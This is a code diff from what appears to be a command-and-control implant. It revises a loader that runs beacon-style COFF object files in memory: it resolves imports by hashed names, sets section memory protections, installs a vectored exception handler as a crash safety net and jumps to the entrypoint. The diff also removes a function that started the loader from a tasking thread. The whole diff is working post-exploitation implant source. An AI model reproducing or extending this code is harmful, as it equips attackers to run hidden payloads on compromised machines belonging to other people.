@@ -54,17 +54,20 @@ namespace Objects {
 
         *pointer = nullptr;
 
+        // __imp_Beacon
         if (Utils::HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
 
             function = sym_string + COFF_PREP_BEACON_SIZE;
             success_(Utils::Scanners::MapScan(implant_map, Utils::HashStringA(function, x_strlen(function)), pointer));
         }
-        else if (Utils::HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
+        // __imp_
+        if (Utils::HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
+            // check for imports
             bool import = Utils::Scanners::SymbolScan(sym_string, 0x24, x_strlen(sym_string));
 
             if (import) {
-                int count   = 0;
-                auto split  = x_split(S_PTR(sym_string) + COFF_PREP_SYMBOL_SIZE, S_PTR(0x24), &count);
+                auto count  = 0;
+                auto split  = x_split(S_PTR(sym_string) + COFF_PREP_SYMBOL_SIZE, S_PTR(0x24), &count); // split '$'
 
                 library     = split[0];
                 function    = split[1];
@@ -75,18 +78,17 @@ namespace Objects {
                 auto fn_hash    = Utils::HashStringA(function, x_strlen(function));
 
                 x_freesplit(split, count);
-
-                C_PTR_HASHES(*pointer, lib_hash, fn_hash);
-                success_(*pointer);
+                success_(C_PTR_HASHES(*pointer, lib_hash, fn_hash));
             }
             else {
                 function = sym_string + COFF_PREP_SYMBOL_SIZE;
+                x_trim(function, 0x40); // trim '@'
 
-                x_trim(function, 0x40);
                 success_(Utils::Scanners::MapScan(loader_map, Utils::HashStringA(function, x_strlen(function)), pointer));
             }
         }
-        else if (Utils::HashStringA(sym_string, x_strlen(sym_string)) == COFF_INSTANCE) {
+        // .refptr.__instance
+        if (Utils::HashStringA(sym_string, x_strlen(sym_string)) == COFF_INSTANCE) {
             *pointer = (_hexane*) GLOBAL_OFFSET;
             success_(true);
         }
@@ -104,8 +106,10 @@ namespace Objects {
         bool success     = true;
         uint32_t protect = 0;
 
+        // register veh as execution safety net
         x_assertb(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler));
 
+        // set section memory attributes
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
             object->section = SECTION_HEADER(object->buffer, sec_index);
 
@@ -134,22 +138,29 @@ namespace Objects {
             x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->fn_map->address, &object->fn_map->size, PAGE_READONLY, nullptr));
         }
 
+        // get names from COFF symbol table and find entrypoint
         for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
+
+            // inlined
             if (object->symbol[sym_index].First.Value[0]) {
                 sym_name = object->symbol[sym_index].First.Name;
             }
+            // not inlined
             else {
                 sym_name = (char*)(object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + object->symbol[sym_index].First.Value[1];
             }
 
+            // compare symbols to function names / entrypoint
             if (x_memcmp(sym_name, function, x_strlen(function)) == 0) {
+                // todo: review this logic...
                 x_assertb(entrypoint = object->sec_map[object->symbol[sym_index].SectionNumber - 1].address + object->symbol[sym_index].Value);
                 break;
             }
         }
 
+        // find section where entrypoint can be found and assert is RX
         for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            if (RANGE(U_PTR(entrypoint), SEC_START(object->sec_map, sec_index), SEC_END(object->sec_map, sec_index))) {
+            if (entrypoint >= object->sec_map[sec_index].address && entrypoint < object->sec_map[sec_index].address + object->sec_map[sec_index].size) {
 
                 object->section = SECTION_HEADER(object->buffer, sec_index);
                 x_assertb((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE);
@@ -159,6 +170,7 @@ namespace Objects {
         WrapperFunction(entrypoint, args, size);
 
         defer:
+        // deregister veh
         if (veh_handle) {
             Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
         }
@@ -409,23 +421,4 @@ namespace Objects {
         x_zerofree(params, sizeof(_coff_params));
     }
 
-    VOID LoadObject(_parser parser) {
-        // todo: maybe loadable objects in remote processes??
-
-        _injection_ctx inject   = { };
-        _coff_params *params    = (_coff_params*) x_malloc(sizeof(_coff_params));
-
-        params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
-        params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
-        params->args        = Parser::UnpackBytes(&parser, (uint32_t*)&params->args_size);
-        params->cache       = Parser::UnpackBool(&parser);
-        params->task_id     = Ctx->session.current_taskid;
-
-        inject.parameter = params;
-        Ctx->threads++;
-
-        if (!Threads::CreateUserThread(NtCurrentProcess(), true, (void*)CoffThread, params, nullptr)) {
-            // get error
-        }
-    }
 }
